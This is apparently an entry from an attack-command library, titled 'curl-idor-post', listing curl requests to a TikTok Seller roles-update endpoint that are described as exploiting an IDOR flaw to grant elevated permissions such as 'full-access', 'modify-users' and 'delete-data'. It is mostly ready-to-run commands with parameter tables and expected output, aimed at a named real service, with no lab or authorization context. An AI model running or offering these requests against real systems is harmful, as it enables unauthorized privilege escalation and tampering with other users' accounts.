---
data: >-
  curl -X POST 'https://seller.tiktok.com/api/roles/update' -H 'Authorization:
  Bearer YOUR_SESSION_TOKEN' -H 'Content-Type: application/json' -d '{"role_id":
  "target-id", "permissions": ["elevated-perm"]}'
tags:
  - web
  - exploit
  - http
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 4fd731f2-fc12-47ae-b0c8-3d61d5791027
created_at: '2025-12-14T17:30:18.011Z'
updated_at: '2025-12-14T17:30:18.011Z'
verified: false
validated: true
submitted: true
---
# curl-idor-post

## Command

```bash
curl -X POST 'https://seller.tiktok.com/api/roles/update' \
  -H 'Authorization: Bearer YOUR_SESSION_TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{"role_id": "target-id", "permissions": ["elevated-perm"]}'
```

## Description

This command sends a POST request to the TikTok Seller roles update endpoint, allowing manipulation of object references for IDOR exploitation. It authenticates with a session token and submits JSON payload to modify role permissions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `URL` | Target endpoint for role updates | Yes |
| `-H 'Authorization: Bearer TOKEN'` | Authentication header with session token | Yes |
| `-H 'Content-Type: application/json'` | Sets JSON payload type | Yes |
| `-d 'JSON_PAYLOAD'` | Data payload with role_id and permissions | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://seller.tiktok.com/api/roles/update' \
  -H 'Authorization: Bearer abc123' \
  -H 'Content-Type: application/json' \
  -d '{"role_id": "finance-specialist-id", "permissions": ["full-access"]}'
```

### Advanced Usage

```bash
curl -X POST 'https://seller.tiktok.com/api/roles/update' \
  -H 'Authorization: Bearer abc123' \
  -H 'Content-Type: application/json' \
  -H 'User-Agent: Mozilla/5.0' \
  -d '{"role_id": "finance-specialist-id", "permissions": ["full-access", "modify-users", "delete-data"]}' \
  -v
```

## Expected Output

Successful execution returns an HTTP 200 response with JSON like {"status": "success", "message": "Role updated"}. Errors may show 403 if authorization fails, or 400 for invalid payload.

## Related

- [[Related Procedure: Exploit-IDOR-to-Modify-Role-Permissions]]
